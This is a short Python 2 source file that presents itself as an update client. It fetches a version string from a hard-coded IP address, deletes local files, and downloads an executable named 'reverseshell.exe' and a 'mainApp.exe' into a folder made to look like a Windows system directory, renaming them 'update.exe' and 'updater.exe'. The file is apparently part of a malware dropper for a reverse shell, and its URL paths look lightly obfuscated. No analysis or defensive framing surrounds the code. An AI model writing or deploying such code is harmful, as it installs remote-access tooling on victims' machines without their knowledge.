from urllib2 import urlopen
from urllib import urlretrieve
import CryptoLib
import os
import update

class Updt(object):
    version = '0'
    crypto = CryptoLib.CryptoLib([2, 6, 4, 8, 5])
    dirPath = 'C:\\Users\\Public\\Windows\\'
    fileName = 'update.exe'
    filePath = dirPath+fileName
    mainAppName = 'updater.exe'
    mainAppPath = dirPath+mainAppName
    fileUrl = 'http://85.255.5.44/vxsrfp/rxso/reverseshell.exe'
    mainAppUrl = 'http://85.255.5.44/vxsrfp/rxso/mainApp.exe'
    versionUrl = 'http://85.255.5.44/vxsrfp/xkv{nqt.html'

    u = update.Update()

    def update(self):
        self.testPath(self.dirPath)
        _version = urlopen(self.versionUrl).read()
        _version = _version[:-1]

        if self.u.getVersion() == _version:
            return "Client is up to date."
        else:
            os.remove(self.filePath)
            os.remove(self.mainAppPath)
            urlretrieve(self.fileUrl,self.filePath)
            urlretrieve(self.mainAppUrl, self.mainAppPath)
            return "Client will be update at next start."


    def testPath(self,path):
        if(os.path.isdir(path)):
            pass
        else:
            os.makedirs(path)

